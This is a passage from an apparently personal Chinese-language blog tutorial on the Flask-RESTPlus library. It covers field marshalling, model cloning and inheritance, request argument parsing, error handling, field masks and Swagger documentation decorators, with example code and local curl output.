'state': 'NY', 'zip': '10468'&#125;&gt;&gt;&gt; json.dumps(marshal(data, resource_fields))'&#123;"name": "bob", "address": &#123;"line 1": "123 fake street", "line 2": "", "state": "NY", "zip": "10468", "city": "New York"&#125;&#125;'注意：上述示例中的 address 字段其实并不存在于数据对象中，但是任何子字段都能够直接从对象中访问该属性，就像它们并不是嵌套关系一样。4.7 列表字段将字段解组成列表1234567&gt;&gt;&gt; from flask_restplus import fields, marshal&gt;&gt;&gt; import json&gt;&gt;&gt;&gt;&gt;&gt; resource_fields = &#123;'name': fields.String, 'first_names': fields.List(fields.String)&#125;&gt;&gt;&gt; data = &#123;'name': 'Bougnazal', 'first_names' : ['Emile', 'Raoul']&#125;&gt;&gt;&gt; json.dumps(marshal(data, resource_fields))&gt;&gt;&gt; '&#123;"first_names": ["Emile", "Raoul"], "name": "Bougnazal"&#125;'4.8 嵌套字段使用 Nested 来将嵌套的数据结构解组，并对其进行适当的渲染1234567891011121314151617181920&gt;&gt;&gt; from flask_restplus import fields, marshal&gt;&gt;&gt; import json&gt;&gt;&gt;&gt;&gt;&gt; address_fields = &#123;&#125;&gt;&gt;&gt; address_fields['line 1'] = fields.String(attribute='addr1')&gt;&gt;&gt; address_fields['line 2'] = fields.String(attribute='addr2')&gt;&gt;&gt; address_fields['city'] = fields.String(attribute='city')&gt;&gt;&gt; address_fields['state'] = fields.String(attribute='state')&gt;&gt;&gt; address_fields['zip'] = fields.String(attribute='zip')&gt;&gt;&gt;&gt;&gt;&gt; resource_fields = &#123;&#125;&gt;&gt;&gt; resource_fields['name'] = fields.String&gt;&gt;&gt; resource_fields['billing_address'] = fields.Nested(address_fields)&gt;&gt;&gt; resource_fields['shipping_address'] = fields.Nested(address_fields)&gt;&gt;&gt; address1 = &#123;'addr1': '123 fake street', 'city': 'New York', 'state': 'NY', 'zip': '10468'&#125;&gt;&gt;&gt; address2 = &#123;'addr1': '555 nowhere', 'city': 'New York', 'state': 'NY', 'zip': '10468'&#125;&gt;&gt;&gt; data = &#123;'name': 'bob', 'billing_address': address1, 'shipping_address': address2&#125;&gt;&gt;&gt;&gt;&gt;&gt; json.dumps(marshal(data, resource_fields))'&#123;"billing_address": &#123;"line 1": "123 fake street", "line 2": null, "state": "NY", "zip": "10468", "city": "New York"&#125;, "name": "bob", "shipping_address": &#123;"line 1": "555 nowhere", "line 2": null, "state": "NY", "zip": "10468", "city": "New York"&#125;&#125;'该示例使用两个 Nested 字段。Nested 构造函数接受一个字段组成的字典，然后将其渲染成一个子 fields.input 对象。Nested 构造函数和嵌套字典（上个例子）之间的重要不同点是：属性的上下文环境。在本例中，billing_address是一个复杂的对象，它拥有自己的字段，而传入到嵌套字段中的上下文环境是子对象，而不是原始的 data 对象。也就是说：data.billing_address.addr1处于该范围，而在前一示例中，data.addr1 则是位置属性。记住：Nested 和List 对象为属性创建了一个新的作用范围。默认情况下，当子对象为 None 时，将会为嵌套字段生成一个包含默认值的对象，而不是 null 值。可以通过传入 allow_null 参数来修改这一点使用 Nested 和 List 来编组更复杂对象的列表12345678user_fields = api.model('User', &#123; 'id': fields.Integer, 'name': fields.String,&#125;)user_list_fields = api.model('UserList', &#123; 'users': fields.List(fields.Nested(user_fields)),&#125;)4.9 api.model()工厂model()工厂允许我们实例化并注册模型到我们的 API 和命名空间（Namespace）中12345678910111213my_fields = api.model('MyModel', &#123; 'name': fields.String, 'age': fields.Integer(min=0)&#125;)# Equivalent tofrom flask_restplus import Modelmy_fields = Model('MyModel', &#123; 'name': fields.String, 'age': fields.Integer(min=0)&#125;)api.models[my_fields.name] = my_fields4.9.1 clone实现复制Model.clone()方法使得我们可以实例化一个增强模型，它能够省去我们复制所有字段的麻烦跟python的类继承有点类似，注意以下两种不同方式的写法。如下面的例子,child除了有其自身的age之外,还有克隆parent过来的name1234567parent = Model('Parent', &#123; 'name': fields.String&#125;)child = parent.clone('Child', &#123; 'age': fields.Integer&#125;)示例代码如下：1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flaskfrom flask_restplus import Resource, Api, fields,Modelapp = Flask(__name__)api = Api(app)parent = Model('Parent', &#123; 'name': fields.String&#125;)child = parent.clone('Child', &#123; 'age': fields.Integer&#125;)api.models[parent.name] = parentapi.models[child.name] = childclass Todo(object): def __init__(self, name, age): self.name = name self.age = age@api.route('/hello')class HelloWorld(Resource): @api.marshal_with(child) def get(self): # return Model(Todo('haha', 24),child) return Todo('haha', 24)if __name__ == '__main__': app.run(debug=True)结果如下：12345C:\Users\sandu&gt;curl http://127.0.0.1:5000/hello&#123; "name": "haha", "age": 24&#125;Api/Namespace.clone 也会将其注册到 API1234567parent = api.model('Parent', &#123; 'name': fields.String&#125;)child = api.clone('Child', parent, &#123; 'age': fields.Integer&#125;)示例代码：1234567891011121314151617181920212223242526272829#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flaskfrom flask_restplus import Resource, Api, fields,Modelapp = Flask(__name__)api = Api(app)parent = api.model('Parent', &#123; 'name': fields.String&#125;)child = api.clone('Child', parent,&#123; 'age': fields.Integer&#125;)class Todo(object): def __init__(self, name, age): self.name = name self.age = age@api.route('/hello')class HelloWorld(Resource): @api.marshal_with(child) def get(self): # return Model(Todo('haha', 24),child) return Todo('haha', 24)结果如下：12345C:\Users\sandu&gt;curl http://127.0.0.1:5000/hello&#123; "name": "haha", "age": 24&#125;4.9.2 api.inherit 实现多态Model.inherit()方法允许我们以“Swagger”方式扩展模型，并开始解决多态问题12345678parent = api.model('Parent', &#123; 'name': fields.String, 'class': fields.String(discriminator=True)&#125;)child = api.inherit('Child', parent, &#123; 'extra': fields.String&#125;)示例代码：123456789101112131415161718192021222324252627282930from flask import Flaskfrom flask_restplus import Resource, Api, fields,Modelapp = Flask(__name__)api = Api(app)parent = api.model('Parent', &#123; 'name': fields.String, 'class': fields.String(discriminator=True) # 根据运行结果识别其作用&#125;)child = api.inherit('Child', parent,&#123; 'extra': fields.String&#125;)class Todo(object): def __init__(self, name, age): self.name = name self.age = age@api.route('/hello')class HelloWorld(Resource): @api.marshal_with(child) def get(self): # return Model(Todo('haha', 24),child) return Todo('haha', 24)if __name__ == '__main__': app.run(debug=True)运行结果：123456C:\Users\sandu&gt;curl http://127.0.0.1:5000/hello&#123; "extra": null, "name": "haha", "class": "Child"&#125;使用浏览器访问(http://127.0.0.1:5000/)的话会看到Models中有两个Api/Namespace.clone 会将 parent 和 child 都注册到 Swagger 模型定义中12345678parent = Model('Parent', &#123; 'name': fields.String, 'class': fields.String(discriminator=True)&#125;)child = parent.inherit('Child', &#123; 'extra': fields.String&#125;)示例代码：123456789101112131415161718192021222324252627282930313233from flask import Flaskfrom flask_restplus import Resource, Api, fields,Modelapp = Flask(__name__)api = Api(app)parent = Model('Parent', &#123; 'name': fields.String, 'class': fields.String() # 此时没有discriminator=True，注意运行结果&#125;)child = parent.inherit('Child', &#123; 'extra': fields.String&#125;)api.models[parent.name] = parentapi.models[child.name] = childclass Todo(object): def __init__(self, name, age): self.name = name self.age = age@api.route('/hello')class HelloWorld(Resource): @api.marshal_with(child) def get(self): # return Model(Todo('haha', 24),child) return Todo('haha', 24)if __name__ == '__main__': app.run(debug=True)运行结果：123456C:\Users\sandu&gt;curl http://127.0.0.1:5000/hello&#123; "extra": null, "name": "haha", "class": null&#125;本例中的class字段只有在其不存在于序列化对象中时，才会以序列化的模型名称进行填充。Polymorph字段允许你指定Python类和字段规范的映射关系：12345678mapping = &#123; Child1: child1_fields, Child2: child2_fields,&#125;fields = api.model('Thing', &#123; owner: fields.Polymorph(mapping)&#125;)注：这段还未看明白啥意思，具体咋操作的，结果如何，留待以后研究。4.10 自定义字段自定义输出字段使得我们可以在无需直接修改内部对象的情况下，进行自定义的输出结果格式化操作。我们只需让类继承Raw，并实现format()方法：123456789class AllCapsString(fields.Raw): def format(self, value): return value.upper()# example usagefields = &#123; 'name': fields.String, 'all_caps_name': AllCapsString(attribute='name'),&#125;示例代码：123456789101112131415161718192021222324252627282930from flask import Flaskfrom flask_restplus import Resource, Api, fields,Modelapp = Flask(__name__)api = Api(app)class AllCapsString(fields.Raw): def format(self, value): return value.upper()fields = &#123; 'name': fields.String, 'all_caps_name': AllCapsString(attribute='age'), # 其值是根据attribute指定的而定，不如attribute='age'，则输出的结果是‘24’，若是attribute='name'，则输出结果是“HAHA”,具体详看下方的运行结果&#125;class Todo(object): def __init__(self, name, age): self.name = name self.age = age@api.route('/hello')class HelloWorld(Resource): @api.marshal_with(fields) def get(self): # return Model(Todo('haha', 24),child) return Todo('haha', '24')if __name__ == '__main__': app.run(debug=True)运行结果如下:1234567891011C:\Users\sandu&gt;curl http://127.0.0.1:5000/hello&#123; "name": "haha", "all_caps_name": "24"&#125;C:\Users\sandu&gt;curl http://127.0.0.1:5000/hello&#123; "name": "haha", "all_caps_name": "HAHA"&#125;也可以使用schema_format、schema_type和schema_example来指定生成的类型和例子：123456789class MyIntField(fields.Integer): __schema_format__ = 'int64'class MySpecialField(fields.Raw): __schema_type__ = 'some-type' __schema_format__ = 'some-format'class MyVerySpecialField(fields.Raw): __schema_example__ = 'hello, world'实际代码：12345678910111213141516171819202122232425262728293031323334353637383940from flask import Flaskfrom flask_restplus import Resource, Api, fields,Modelapp = Flask(__name__)api = Api(app)class AllCapsString(fields.Raw): def format(self, value): return value.upper()class MyIntField(fields.Integer): __schema_format__ = 'int64'class MySpecialField(fields.Raw): # 具体作用还有待研究 __schema_type__ = 'string' __schema_format__ = 'string' __schema_example__ = 'hello, world'fields = &#123; 'name': fields.String, 'all_caps_name': AllCapsString(attribute='name'), 'age':MyIntField(), # 有转换数据类型的功能，输入的是字符串'22',运行结果显示的是数字22 'class':MySpecialField(attribute='banji')&#125;class Todo(object): def __init__(self, name, age, banji): self.name = name self.age = age self.banji = banji@api.route('/hello')class HelloWorld(Resource): @api.marshal_with(fields) def get(self): # return Model(Todo('haha', 24),child) return Todo('haha','22','erjini')if __name__ == '__main__': app.run(debug=True)4.11 跳过值为None的字段将可选参数skip_none设置为True12345678910111213&gt;&gt;&gt; from flask_restplus import Model, fields, marshal_with&gt;&gt;&gt; import json&gt;&gt;&gt; model = Model('Model', &#123;... 'name': fields.String,... 'address_1': fields.String,... 'address_2': fields.String... &#125;)&gt;&gt;&gt; @marshal_with(model, skip_none=True)... def get():... return &#123;'name': 'John', 'address_1': None&#125;...&gt;&gt;&gt; get()OrderedDict([('name', 'John')])可以看到，address_1和address_2被marshal_with()跳过了。address_1被跳过是因为它的值为None，而address_2被跳过是因为get()返回的字典中并不包含address_2这个key。4.12跳过嵌套字段中的None字段123456&gt;&gt;&gt; from flask_restplus import Model, fields, marshal_with&gt;&gt;&gt; import json&gt;&gt;&gt; model = Model('Model', &#123;... 'name': fields.String,... 'location': fields.Nested(location_model, skip_none=True)... &#125;)4.13 使用JSON Schema定义模型注：这个还不知道具体咋使用的12345678910111213141516171819202122232425262728address = api.schema_model('Address', &#123; 'properties': &#123; 'road': &#123; 'type': 'string' &#125;, &#125;, 'type': 'object'&#125;)person = address = api.schema_model('Person', &#123; 'required': ['address'], 'properties': &#123; 'name': &#123; 'type': 'string' &#125;, 'age': &#123; 'type': 'integer' &#125;, 'birthdate': &#123; 'type': 'string', 'format': 'date-time' &#125;, 'address': &#123; '$ref': '#/definitions/Address', &#125; &#125;, 'type': 'object'&#125;)5.请求解析Flask-RESTPlus的请求解析接口reqparse是模仿argparse接口实现的。它的设计目的是对Flask中flask.request对象上的任何变量提供简单和统一的访问方式。5.1 基本参数如下是一个简单示例，在flask.Request.values字典中查找两个参数：一个整数和一个字符串：1234567from flask_restplus import reqparseparser = reqparse.RequestParser()parser.add_argument('rate', type=int, help='Rate cannot be converted')parser.add_argument('name')args = parser.parse_args()默认参数类型是unicode字符串。在Python3中为str类型，而在Python2中为unicode。如果指定了help变量的值，那么在解析请求时，如果出现了类型错误，那么会将它渲染为错误信息。如果未指定help信息，那么默认的行为是返回类型错误信息本身。默认情况下，参数不是必需的。并且，如果请求中提供的某些参数不是RequestParser的部分内容，那么这些参数将会被忽略。请求解析器中声明的参数，如果在请求中并未设置这些参数值，那么它们将会默认设置为None。5.2 必须参数如果需要确保某个参数必须提供，那么可以在调用add_argument()时传入required=True的参数项：1parser.add_argument('name', required=True, help="Name cannot be blank!")如果请求中未提供该参数，那么将会返回错误信息5.3 多值和列表为某个key接受多个值以构成列表，那么可以传入action=’append’：1parser.add_argument('name', action='append')此时的查询格式如下所示：1curl http://api.example.com -d "name=bob" -d "name=sue" -d "name=joe"而程序中获取到的参数如下所示：12args = parser.parse_args()args['name'] # ['bob', 'sue', 'joe']如果期望一个逗号分隔的列表，那么可以使用action=’split’：1parser.add_argument('fruits', action='split')此时的查询格式如下所示：1curl http://api.example.com -d "fruits=apple,lemon,cherry"而程序中获取到的参数如下所示：12args = parser.parse_args()args['fruits'] # ['apple', 'lemon', 'cherry']5.4 其他目标如果期望参数一旦被解析，就将其存储为其他名字，那么可以使用dest参数：1234parser.add_argument('name', dest='public_name')args = parser.parse_args()args['public_name']5.5 参数位置默认情况下，RequestParser尝试从flask.Request.values和flask.Request.json中解析值。在add_argument()中使用location参数来指定获取值的其他位置。可以使用flask.Request上的任何变量，例如：1234567891011121314# 仅仅在POST body中查找parser.add_argument('name', type=int, location='form')# 仅仅在querystring中查找parser.add_argument('PageSize', type=int, location='args')# 从请求头中查找parser.add_argument('User-Agent', location='headers')# 从http cookies中查找parser.add_argument('session_id', location='cookies')# 从上传文件中查找parser.add_argument('picture', type=werkzeug.datastructures.FileStorage, location='files')当location=’json’时只能使用type=list使用location=’form’既能验证表单数据，又能为表单字段文档化5.6 参数多位置为location参数赋一个列表就能为参数指定多个位置：1parser.add_argument('text', location=['headers', 'values'])当指定多个参数位置时，那么所有指定位置的参数将会组成一个MultiDict。其中，列表中最后位置处的参数将会优先存储在结果集中。如果参数位置列表中包含headers位置，那么参数名将变成对大小写敏感，并且必须匹配它们的标题大小写名称（见str.title()）。指定location=’headers’（而不是作为列表的某个元素）将保留大小写不敏感的特性。5.7 高级类型处理inputs模块中提供了一些常用的类型处理方法，如下：- boolean()用于广泛的布尔值处理 - ipv4()和ipv6()用于IP地址 - date_from_iso8601()和datetime_from_iso8601()用于ISO8601 date和datetime处理 只需要使用它们作为type参数的值即可：1parser.add_argument('flag', type=inputs.boolean)我们也可以编写自己的输入类型：12345678def my_type(value): '''Parse my type''' if not condition: raise ValueError('This is not my type') return parse(value)# Swagger documntationmy_type.__schema__ = &#123;'type': 'string', 'format': 'my-custom-format'&#125;5.8 解析器继承可以编写一个父解析器，父解析器中包含所有共同的参数，然后利用copy()方法来扩展解析器。另外，也可以利用replace_argument()来覆写父解析器中的任何参数，或者利用remove_argument()完全移除父解析器中的某个参数。例如：12345678910111213141516from flask_restplus import reqparseparser = reqparse.RequestParser()parser.add_argument('foo', type=int)parser_copy = parser.copy()parser_copy.add_argument('bar', type=int)# parser_copy has both 'foo' and 'bar'parser_copy.replace_argument('foo', required=True, location='json')# 'foo' is now a required str located in json, not an int as defined# by original parserparser_copy.remove_argument('foo')# parser_copy no longer has 'foo' argument5.9 文件上传为了利用RequestParser处理文件上传问题，我们需要将location变量值设置为files，并设置type值为FileStorage。如下所示：123456789101112131415161718from werkzeug.datastructures import FileStorageimport tempfileupload_parser = api.parser()upload_parser.add_argument('file', location='files', type=FileStorage, required=True)@api.route('/upload/')@api.expect(upload_parser)class Upload(Resource): def post(self): args = upload_parser.parse_args() file_ = args['file'] file_descriptor, filename = tempfile.mkstemp(suffix='.xlsx') file_.save(filename) # 保存文件 # print(filename) # 获取文件的绝对路径 return 'success'5.10 错误处理RequestParser处理错误的默认方式是在第一个错误产生时中断。当我们拥有需要花费一定时间来处理的参数时，这种方式是有好处的。然而，通常来说，将所有产生的错误都绑定在一起，然后同时一次性返回给客户端，这种方式则更加友好。这种方式既可以在Flask应用级别指定，也可以在特定的RequestParser实例级别指定。为了调用一个包含错误绑定选项的RequestParser，需要传入参数bundle_errors。例如：123456789101112131415161718192021222324from flask_restplus import reqparseparser = reqparse.RequestParser(bundle_errors=True)parser.add_argument('foo', type=int, required=True)parser.add_argument('bar', type=int, required=True)# # 如果某个请求中同时不包含'foo'和'bar'，那么返回的错误将看起来如下所示：&#123; "message": &#123; "foo": "foo error message", "bar": "bar error message" &#125;&#125;# 默认操作将仅仅返回第一个错误parser = RequestParser()parser.add_argument('foo', type=int, required=True)parser.add_argument('bar', type=int, required=True)&#123; "message": &#123; "foo": "foo error message" &#125;&#125;示例代码：12345678910111213141516171819202122from flask import Flaskfrom flask_restplus import Resource, Api, reqparseapp = Flask(__name__)api = Api(app)parser = reqparse.RequestParser(bundle_errors=True)parser.add_argument('foo', type=int, required=True)parser.add_argument('bar', type=int, required=True)@api.route('/hello')class HelloWorld(Resource): def get(self): return '111' def put(self): args = parser.parse_args() print(args) return '222'if __name__ == '__main__': app.run(debug=True)123456789101112131415161718192021# 设置bundle_errors=True的情况C:\Users\sandu&gt;curl http://127.0.0.1:5000/hello -X PUT&#123; "errors": &#123; "foo": "Missing required parameter in the JSON body or the post body orthe query string", "bar": "Missing required parameter in the JSON body or the post body orthe query string" &#125;, "message": "Input payload validation failed"&#125;# 未设置bundle_errors=True的情况C:\Users\sandu&gt;curl http://127.0.0.1:5000/hello -X PUT&#123; "errors": &#123; "foo": "Missing required parameter in the JSON body or the post body orthe query string" &#125;, "message": "Input payload validation failed"&#125;应用级别的配置key为“BUNDLE_ERRORS”。例如：1234from flask import Flaskapp = Flask(__name__)app.config['BUNDLE_ERRORS'] = TrueBUNDLE_ERRORS是一个全局设置，它将覆盖每个RequestParser实例中的bundle_errors选项值4.11 错误消息每个字段的错误消息都可以通过在Argument（也包括RequestParser.add_argument）中使用help参数来自定义。如果没有提供help参数，那么该字段的错误消息将会是类型错误本身的字符串表示。如果提供了help参数，那么错误消息将会是help参数的值。help可能包含一个插入的符号{error_msg}，它将会替换成类型错误的字符串表示。这种方式能够实现自定义错误消息，同时保留原始的错误消息。如下所示：123456789101112131415from flask_restplus import reqparseparser = reqparse.RequestParser()parser.add_argument( 'foo', choices=('one', 'two'), help='Bad choice: &#123;error_msg&#125;')# 如果请求中的'foo'参数值为'three'，那么错误信息将会如下所示：&#123; "message": &#123; "foo": "Bad choice: three is not a valid choice", &#125;&#125;实际代码：12345678910111213141516171819202122from flask import Flaskfrom flask_restplus import Resource, Api, reqparseapp = Flask(__name__)api = Api(app)# choices参数表示变量的值是从这中间的值parser = reqparse.RequestParser()parser.add_argument('foo', choices=('one', 'two'), help='Bad choice: &#123;error_msg&#125;',required=True)@api.route('/hello')class HelloWorld(Resource): def get(self): return '111' def put(self): args = parser.parse_args() print(args) return '222'if __name__ == '__main__': app.run(debug=True)123456789# 生成的错误信息跟官方提供的有点不一样，具体如下：C:\Users\sandu&gt;curl http://127.0.0.1:5000/hello -d "foo=three" -X PUT&#123; "errors": &#123; "foo": "Bad choice: &#123;error_msg&#125; The value 'three' is not a valid choicefor 'foo'." &#125;, "message": "Input payload validation failed"&#125;6.错误处理6.1 http异常处理Werkzeug httpException将自动正确序列化，并重用description属性。12from werkzeug.exceptions import BadRequestraise BadRequest()返回如下的400错误代码和信息：123&#123; "message": "The browser (or proxy) sent a request that this server could not understand."&#125;若是设置的有自定义的错误信息，比如这样的：12from werkzeug.exceptions import BadRequestraise BadRequest('My custom message')错误显示信息将会是这样的：123&#123; "message": "My custom message"&#125;还可以 通过向异常提供数据属性，可以将附加属性附加到输出。1234from werkzeug.exceptions import BadRequeste = BadRequest('My custom message')e.data = &#123;'custom': 'value'&#125;raise e错误显示信息将会是这样的：1234&#123; "message": "My custom message", "custom": "value"&#125;6.2 Flask错误助手abort帮助程序将错误正确包装到httpexception中，以便具有相同的行为。12from flask import abortabort(400)返回如下的400错误代码和信息：123&#123; "message": "The browser (or proxy) sent a request that this server could not understand."&#125;如果在abort中指定错误代码和错误信息，比如：12from flask import abortabort(400, 'My custom message')错误显示信息将会是这样的：123&#123; "message": "My custom message"&#125;6.3 Flask-RESTPlus错误助手errors.abort()和namespace.abort()的工作方式与原始flask.abort()类似，但它还将向响应添加关键字参数。12from flask_restplus import abortabort(400, custom='value')返回如下的400错误代码和信息：1234&#123; "message": "The browser (or proxy) sent a request that this server could not understand.", "custom": "value"&#125;如果在abort中指定错误代码和错误信息，比如：12from flask import abortabort(400, 'My custom message', custom='value')错误显示信息将会是这样的：1234&#123; "message": "My custom message", "custom": "value"&#125;6.4 @api.errorhandler装饰器@api.errorhandler 装饰器允许您以与flask/blueprint@errorhandler decorator相同的方式为给定的异常（或从中继承的任何异常）注册特定的处理程序。12345678910111213141516171819202122232425262728@api.errorhandler(RootException)def handle_root_exception(error): '''Return a custom message and 400 status code''' return &#123;'message': 'What you want'&#125;, 400@api.errorhandler(CustomException)def handle_custom_exception(error): '''Return a custom message and 400 status code''' return &#123;'message': 'What you want'&#125;, 400@api.errorhandler(AnotherException)def handle_another_exception(error): '''Return a custom message and 500 status code''' return &#123;'message': error.specific&#125;@api.errorhandler(FakeException)def handle_fake_exception_with_header(error): '''Return a custom message and 400 status code''' return &#123;'message': error.message&#125;, 400, &#123;'My-Header': 'Value'&#125;@api.errorhandler(NoResultFound)def handle_no_result_exception(error): '''Return a custom not found error message and 404 status code''' return &#123;'message': error.specific&#125;, 404OpenAPI 2.0规范要求“noresultfound”错误（带说明）。错误句柄函数中的docstring将作为说明输出到swagger.json中。或者使用如下的这种方式：1234567891011121314151617@api.errorhandler(FakeException)@api.marshal_with(error_fields, code=400)@api.header('My-Header', 'Some description')def handle_fake_exception_with_header(error): '''This is a custom error''' return &#123;'message': error.message&#125;, 400, &#123;'My-Header': 'Value'&#125;@api.route('/test/')class TestResource(Resource): def get(self): ''' Do something :raises CustomException: In case of something ''' pass在这个例子中，函数文档中的:raise:的信息将会自动提取出来，并且响应400将正确记录它还允许在不使用参数的情况下重写默认错误处理程序1234@api.errorhandlerdef default_error_handler(error): '''Default error handler''' return &#123;'message': str(error)&#125;, getattr(error, 'code', 500)默认情况下，flask restplus将在错误响应中返回一条消息。如果需要自定义响应作为错误，而不需要消息字段，则可以通过在应用程序配置中将error_include_message设置为false来禁用该响应。也可以在命名空间上注册错误处理程序。在命名空间上注册的错误处理程序将重写在API上注册的错误处理程序。123456ns = Namespace('cats', description='Cats related operations')@ns.errorhandlerdef specific_namespace_error_handler(error): '''Namespace error handler''' return &#123;'message': str(error)&#125;, getattr(error, 'code', 500)7.字段掩码flask restplus支持部分对象获取（aka.字段屏蔽）通过在请求中提供自定义头。默认情况下，请求头是X-Fields字段，但可以使用restplus_mask_header参数进行更改。7.1 语法只需提供一个由逗号分隔的字段名列表，可以选择用括号括起来。12345678# 以下两种写法作用相等mask = '&#123;name,age&#125;'# 或者mask = 'name,age'data = requests.get('/some/url/', headers=&#123;'X-Fields': mask&#125;)assert len(data) == 2assert 'name' in dataassert 'age' in data要指定嵌套字段掩码，只需在字段名后面的括号中提供它：1mask = '&#123;name, age, pet&#123;name&#125;&#125;'嵌套规范适用于嵌套对象或对象列表：12# Will apply the mask &#123;name&#125; to each pet in the pets list.mask = '&#123;name, age, pets&#123;name&#125;&#125;'有一个特殊的星形标记，意思是“所有剩余字段”。它只允许指定嵌套筛选：12345# Will apply the mask &#123;name&#125; to each pet in the pets list and take all other root fields without filtering.mask = '&#123;pets&#123;name&#125;,*&#125;'# Will not filter anythingmask = '*'7.2 用法默认情况下，每次使用api.marshal或@api.marshal_with时，如果存在头，则会自动应用掩码。每次将@api.marshal_与decorator一起使用时，头都将作为一个swager参数公开。因为一旦全局头可以使您的Swagger规范更加冗长，它就不允许公开它。您可以通过将restplus_mask_swagger设置为false来禁用此行为。还可以指定一个默认掩码，如果找不到头掩码，则将应用该默认掩码。1234class MyResource(Resource): @api.marshal_with(my_model, mask='name,age') def get(self): pass默认掩码也可以在模型级别处理：12345model = api.model('Person', &#123; 'name': fields.String, 'age': fields.Integer, 'boolean': fields.Boolean,&#125;, mask='&#123;name,age&#125;')要覆盖默认掩码，您需要提供另一个掩码或将*作为掩码传递。8. Swagger文档Swagger API文档是自动生成的，可以从API的根URL获得。您可以使用@api.doc()装饰器配置文档。8.1 @api.doc()装饰器文档@api.doc()装饰器允许您在文档中包含其他信息。可以在class类中或者method中123456789@api.route('/my-resource/&lt;id&gt;', endpoint='my-resource')@api.doc(params=&#123;'id': 'An ID'&#125;)class MyResource(Resource): def get(self, id): return &#123;&#125; @api.doc(responses=&#123;403: 'Not Authorized'&#125;) def post(self, id): api.abort(403)8.2 自动文件模型使用model（）、clone（）和inherit（）实例化的所有模型都将自动记录在您的swager规范中。inherit()方法将在swager模型定义中同时注册父级和子级：12345678parent = api.model('Parent', &#123; 'name': fields.String, 'class': fields.String(discriminator=True)&#125;)child = api.inherit('Child', parent, &#123; 'extra': fields.String&#125;)上述配置将产生以下Swagger 定义：123456789101112131415161718"Parent": &#123; "properties": &#123; "name": &#123;"type": "string"&#125;, "class": &#123;"type": "string"&#125; &#125;, "discriminator": "class", "required": ["class"]&#125;,"Child": &#123; "allOf": [&#123; "$ref": "#/definitions/Parent" &#125;, &#123; "properties": &#123; "extra": &#123;"type": "string"&#125; &#125; &#125; ]&#125;8.3@api.marshal_with()装饰器此装饰器的工作方式与原始marshal_with（）装饰器类似，不同之处在于它记录了这些方法。可选参数代码允许您指定预期的HTTP状态代码（默认为200）。可选参数as_list允许您指定对象是否作为列表返回。12345678910111213resource_fields = api.model('Resource', &#123; 'name': fields.String,&#125;)@api.route('/my-resource/&lt;id&gt;', endpoint='my-resource')class MyResource(Resource): @api.marshal_with(resource_fields, as_list=True) def get(self): return get_objects() @api.marshal_with(resource_fields, code=201) def post(self): return create_object(), 201Api.marshal_list_with()装饰器严格相等于Api.marshal_with(fields, as_list=True)()。12345678910111213resource_fields = api.model('Resource', &#123; 'name': fields.String,&#125;)@api.route('/my-resource/&lt;id&gt;', endpoint='my-resource')class MyResource(Resource): @api.marshal_list_with(resource_fields) def get(self): return get_objects() @api.marshal_with(resource_fields) def post(self): return create_object()8.4 @api.expect()装饰器@api.expect（）装饰器允许您指定预期的输入字段。它接受一个可选的布尔参数validate，指示是否应验证有效负载。通过将restplus_validate配置设置为true或将validate=true传递给API构造函数，可以全局自定义验证行为。如下两个例子的作用是相等的：使用@api.expect()装饰器123456789resource_fields = api.model('Resource', &#123; 'name': fields.String,&#125;)@api.route('/my-resource/&lt;id&gt;')class MyResource(Resource): @api.expect(resource_fields) def get(self): pass使用api.doc()装饰器123456789resource_fields = api.model('Resource', &#123; 'name': fields.String,&#125;)@api.route('/my-resource/&lt;id&gt;')class MyResource(Resource): @api.doc(body=resource_fields) def get(self): pass可以将列表指定为预期输入：123456789resource_fields = api.model('Resource', &#123; 'name': fields.String,&#125;)@api.route('/my-resource/&lt;id&gt;')class MyResource(Resource): @api.expect([resource_fields]) def get(self): pass可以使用RequestParser定义预期的输入：123456789parser = api.parser()parser.add_argument('param', type=int, help='Some param', location='form')parser.add_argument('in_files', type=FileStorage, location='files')@api.route('/with-parser/', endpoint='with-parser')class WithParserResource(restplus.Resource): @api.expect(parser) def get(self): return &#123;&#125;可以在特定终结点上启用或禁用验证：123456789101112131415resource_fields = api.model('Resource', &#123; 'name': fields.String,&#125;)@api.route('/my-resource/&lt;id&gt;')class MyResource(Resource): # Payload validation disabled @api.expect(resource_fields) def post(self): pass # Payload validation enabled @api.expect(resource_fields, validate=True) def post(self): pass通过配置进行的应用程序范围验证示例：12345678910111213141516171819app.config['RESTPLUS_VALIDATE'] = Trueapi = Api(app)resource_fields = api.model('Resource', &#123; 'name': fields.String,&#125;)@api.route('/my-resource/&lt;id&gt;')class MyResource(Resource): # Payload validation enabled @api.expect(resource_fields) def post(self): pass # Payload validation disabled @api.expect(resource_fields, validate=False) def post(self): pass构造函数在应用程序范围内验证的示例：1234567891011121314151617api = Api(app, validate=True)resource_fields = api.model('Resource', &#123; 'name': fields.String,&#125;)@api.route('/my-resource/&lt;id&gt;')class MyResource(Resource): # Payload validation enabled @api.expect(resource_fields) def post(self): pass # Payload validation disabled @api.expect(resource_fields, validate=False) def post(self): pass8.5 @api.response()装饰器文档@api.response()装饰器允许您记录已知的响应，它是@api.doc(responses=’’的快捷方式)如下两个示例是相等的：12345678910111213141516@api.route('/my-resource/')class MyResource(Resource): @api.response(200, 'Success') @api.response(400, 'Validation Error') def get(self): pass@api.route('/my-resource/')class MyResource(Resource): @api.doc(responses=&#123; 200: 'Success', 400: 'Validation Error' &#125;) def get(self): pass您可以选择指定响应模型作为第三个参数：123456789model = api.model('Model', &#123; 'name': fields.String,&#125;)@api.route('/my-resource/')class MyResource(Resource): @api.response(200, 'Success', model) def get(self): pass@api.marshal_with()装饰器自动记录响应：12345678910model = api.model('Model', &#123; 'name': fields.String,&#125;)@api.route('/my-resource/')class MyResource(Resource): @api.response(400, 'Validation error') @api.marshal_with(model, code=201, description='Object created') def post(self): pass您可以指定在不知道响应代码的情况下发送的默认响应：12345@api.route('/my-resource/')class MyResource(Resource): @api.response('default', 'Error') def get(self): pass8.6 @api.route()装饰器您可以使用api.route()的doc参数提供类范围的文档。此参数接受与api.doc()装饰器相同的值。以下两种装饰器例子作用相同：使用@api.doc()12345@api.route('/my-resource/&lt;id&gt;', endpoint='my-resource')@api.doc(params=&#123;'id': 'An ID'&#125;)class MyResource(Resource): def get(self, id): return &#123;&#125;使用@api.route()1234@api.route('/my-resource/&lt;id&gt;', endpoint='my-resource', doc=&#123;'params':&#123;'id': 'An ID'&#125;&#125;)class MyResource(Resource): def get(self, id): return &#123;&#125;8.7 fields参数……未完待续……]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
